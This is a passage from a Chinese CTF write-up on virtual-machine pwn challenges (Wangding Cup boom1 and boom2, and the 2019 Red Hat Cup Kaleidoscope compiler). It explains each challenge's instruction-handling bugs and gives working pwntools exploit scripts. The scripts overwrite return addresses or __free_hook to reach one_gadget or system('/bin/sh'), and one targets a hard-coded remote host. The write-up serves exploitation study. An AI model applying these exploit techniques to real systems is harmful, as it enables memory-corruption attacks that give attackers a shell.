        fake_heap2 = heap_base + (0x56559ac9-0x56559000)
        fake_heap3 = heap_base + (0x56559ad6-0x56559000)
        data = p8(0x80)+p8(0x6)+p32(fake_heap)+p8(0x76)+p32(malloc)+p8(0x54)+'\x00'
        data += p8(0x80)+p8(0x6)+p32(fake_heap1)+p8(0x76)+p32(malloc+1)+p8(0x54)+'\x00'
        data += p8(0x80)+p8(0x6)+p32(fake_heap2)+p8(0x76)+p32(malloc+2)+p8(0x54)+'\x00'
        data += p8(0x80)+p8(0x6)+p32(fake_heap3)+p8(0x76)+p32(malloc+3)+p8(0x54)+'\x00'
        data += '\x99'
        Add(data)
        Start()
        raw_input()
        p.send(p8(shell&0xff))
        raw_input()
        p.send(p8((shell&0xffff)>>8))
        raw_input()
        p.send(p8((shell>>16)&0xff))
        raw_input()
        p.send(p8((shell>>24)))
        #gdb.attach(p,'b* 0x56555000+ 0xcaf')
        p.recvuntil('>>>')
        p.sendline('3')
        p.interactive()
    exp()
### 网鼎杯青龙组boom2
#### 程序逻辑
main函数的开始部分分配了两个大小为`0x40000uLL`的堆块，因为大于了默认的heap分配阈值，调用mmap分配内存，在堆地址中存储了一个栈地址。
    setbuf(stdout, 0LL);
    setbuf(stdin, 0LL);
    setbuf(stderr, 0LL);
    chunk_addr = (signed __int64 *)malloc(0x40000uLL);// >0x23000,mmap
    buf = (char *)malloc(0x40000uLL);
    printf("MC execution system\nInput your code> ", 0LL);
    read(0, buf, 0x120uLL);
    chunk_addr += 0x8000;
    chunk_8000_addr = chunk_addr;
    --chunk_addr;
    *chunk_addr = 0x1ELL;
    --chunk_addr;
    *chunk_addr = 0xDLL;
    v4 = chunk_addr;
    --chunk_addr;
    *chunk_addr = a1 - 1;
    --chunk_addr;
    *chunk_addr = (signed __int64)(a2 + 1);       // 这里放了栈地址进去
    chunk_8000_addr_sub_1 = chunk_addr - 1;
    *chunk_8000_addr_sub_1 = (signed __int64)v4;  // 堆里保存了自己的地址
    v37 = 0LL;
整个虚拟机只能执行一次，且最多执行30条指令，这里依然是只分析重点的指令，其他包括`v36和*chunk_8000_addr_sub_1`的`add/sub/mul/div/>>/&/^`等运算，不一而足。
0x0的指令存在一个明显的堆越界读，将数据赋值给v36。
0x6的指令存在同样的问题，只不过赋值的对象变成了`chunk_8000_addr_sub_1`。
0x9指令将v36作为地址取值再赋给v36。
0x11指令为v36的双重取值再赋值。
0x13指令执行`*chunk_8000_addr_sub_1 = v36`，这条指令将v36和chunk_8000_addr_sub_1关联了起来。
    //choice=0
    buf2 = buf;// choice为0
    buf += 8;
    v36 = (signed __int64)&chunk_8000_addr[*buf2];// v7可控的话这里有堆越界
    //choice=1
    buf3 = (signed __int64 *)buf;// choice=1
    buf += 8;
    v36 = *buf3;// 取buf值赋值给v36
    // choice=6
    chunk_8000_addr_sub_2 = chunk_8000_addr_sub_1 - 1;
    *chunk_8000_addr_sub_2 = (signed __int64)chunk_8000_addr;
    chunk_8000_addr = chunk_8000_addr_sub_2;
    buf4 = buf;
    buf += 8;
    chunk_8000_addr_sub_1 = &chunk_8000_addr_sub_2[-*buf4];// （注意要乘8）前溢将堆地址赋值给这个值
    //choice=9
    v36 = *(_QWORD *)v36;//取8字节v36地址上的值赋给v36
    //choice=11
    v13 = (signed __int64 **)chunk_8000_addr_sub_1;// v13先放一个map地址，这个地址的值是retn_addr
    ++chunk_8000_addr_sub_1;
    **v13 = v36;//两次取值，赋值为一个可控值
    //choice=13
    --chunk_8000_addr_sub_1;//把v36写到堆上
    *chunk_8000_addr_sub_1 = v36;// 先让v36得到我们的那个目标值
#### 漏洞利用
这里没有输出函数，我们考虑将返回地址的`__libc_start_main`函数直接拷贝到map地址，通过加运算得到`one_gadget`。
将map上的原栈地址进行加减运算得到`retn_addr`，再用双重赋值指令把`one_gadget`写入到`retn_addr`。在exp注释中详细解释了每一条指令的目的。
    #coding=utf-8
    from pwn import *
    r = lambda p:p.recv()
    rl = lambda p:p.recvline()
    ru = lambda p,x:p.recvuntil(x)
    rn = lambda p,x:p.recvn(x)
    rud = lambda p,x:p.recvuntil(x,drop=True)
    s = lambda p,x:p.send(x)
    sl = lambda p,x:p.sendline(x)
    sla = lambda p,x,y:p.sendlineafter(x,y)
    sa = lambda p,x,y:p.sendafter(x,y)
    context.update(arch='amd64',os='linux',log_level='DEBUG')
    context.terminal = ['tmux','split','-h']
    debug = 2
    elf = ELF('./pwn')
    libc_offset = 0x3c4b20
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')
    if debug == 1:
        gadgets = [0x45216,0x4526a,0xcd0f3,0xcd1c8,0xf02a4,0xf02b0,0xf1147,0xf66f0]
        p = process('./pwn')
    elif debug == 2:
        gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
        p = process('./pwn', env={'LD_PRELOAD':'./libc6_2.23-0ubuntu10_amd64.so'})
    else:
        p = remote('182.92.73.10',36642)
    def exp():
        #environ+0xf0 = retn_addr
        libc_base = 0x7ffff7a0d000
        shell_addr = gadgets[3]
        target = libc.sym['__libc_start_main']+240
        off = shell_addr - target
        print hex(off)
        p.recvuntil("Input your code> ")
        #gdb.attach(p,'b* 0x0000555555554000+0xb72')
        #gdb.attach(p,'b* 0x0000555555554000+0xe43')
        #set args = bin_sh
        payload = flat([
            0,-4,#set v36 = map_addr(stack_addr on it)
            9,#set v36 = stack_addr
            6,0x101e0,#set chunk_8000_addr_sub_1
            25,#set v36 = retn_addr
            6,-0x101e3,#set chunk_8000_addr_sub_1 = map_addr
            13,#set map_addr(retn_addr)
            9,#set v36 = libc_start_main+240
            6,0x101e0,#set map_addr
            25,#set v36 = one_gadget
            6,-0x101e1,#set chunk_8000_addr_sub_1 = map_addr
            11,#set retn_addr(one_gadget)
            ])
        payload = payload.ljust(8*26,'\x00')
        payload += flat([
            -0xe8,off,0x12345678
            ])
        p.sendline(payload)
        p.interactive()
    exp()
## 编译器类VM
这类VM主要接收用户的高级语言形式的代码，模拟编译执行，相比于汇编类的VM，它更加灵活，难度也更高，做题没有固定的套路，需要自己结合题目环境解题。
### 2019红帽杯-万花筒
#### 程序逻辑 && 漏洞利用
题目是用llvm自己实现的一个小型编译器，是llvmcookbook的示例改的，toy语言，看Kaleidoscope这个名字应该就可以找到教程，gettok里定义了一些标识符，在划分语元的时候使用，这里有def、extern、if等。
在引用未定义的函数会提示`Error: Unknown function referenced`,
假如我们定义一个名称与库函数相同且没有body的函数(如`def system(a);`), 第一次调用提示`Error: Unknown unary
operator`,
之后能调用到库函数，因此我们调用`mmap`分配一块固定内存地址存放`/bin/sh`，之后调用`sytem(map_addr)`来get shell。
    from pwn import *
    p = process("./pwn2")
    p.recvuntil("ready> ")
    p.sendline("def mmap(a b c d e f);")
    p.recvuntil("ready> ")
    p.sendline("mmap(1,1,1,1,1,1);")
    p.recvuntil("ready> ")
    p.sendline("def read(a b c);")
    p.recvuntil("ready> ")
    p.sendline("read(1,1,1);")
    p.recvuntil("ready> ")
    p.sendline("mmap("+str(0x10000)+","+str(0x1000)+",3,34,0,0);") 
    p.recvuntil("ready> ")
    p.recvuntil("ready> ")
    p.sendline("read(0,65536,20);")
    p.recvuntil("ready> ")
    p.sendline("/bin/sh")
    p.recvuntil("ready> ")
    p.sendline("def system(a);")
    p.recvuntil("ready> ")
    p.sendline("system(0);")
    p.recvuntil("ready> ")
    p.sendline("system(65536);")
    p.interactive()
### 2020网鼎杯青龙组-boom1
#### 程序逻辑 && 漏洞利用
这道题目也是一道编译器类的VM，程序限制我们只能进行一次函数调用，在调试过程中可以发现存储我们指令的内存地址是通过map得到的，因此其地址和libc地址偏移是固定的，我们可以定义一个变量，从这个变量的地址寻址到`__free_hook`和`system`函数，将后者覆写到前者，再调用`free('/bin/sh')`即可。
    #coding=utf-8
    from pwn import *
    r = lambda p:p.recv()
    rl = lambda p:p.recvline()
    ru = lambda p,x:p.recvuntil(x)
    rn = lambda p,x:p.recvn(x)
    rud = lambda p,x:p.recvuntil(x,drop=True)
    s = lambda p,x:p.send(x)
    sl = lambda p,x:p.sendline(x)
    sla = lambda p,x,y:p.sendlineafter(x,y)
    sa = lambda p,x,y:p.sendafter(x,y)
    context.update(arch='amd64',os='linux',log_level='DEBUG')
    context.terminal = ['tmux','split','-h']
    debug = 1
    elf = ELF('./pwn')
    libc_offset = 0x3c4b20
    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
    if debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./pwn')
    def exp():
        gdb.attach(p,'b* 0x555555558724')
        p.recvuntil("I'm living...")
        payload = '''main(){int a;a=0x12345677;*(&a-161542)=&a-620937;free("/bin/sh");}'''
        p.sendline(payload)
        p.interactive()
    exp()
## 总结
从我们举的例题中可以看到汇编类的VMPwn核心是逆向和对于已有指令的组合，编译器类的VMPwn则需要动态的调试去寻找规律，相比于前者更加复杂。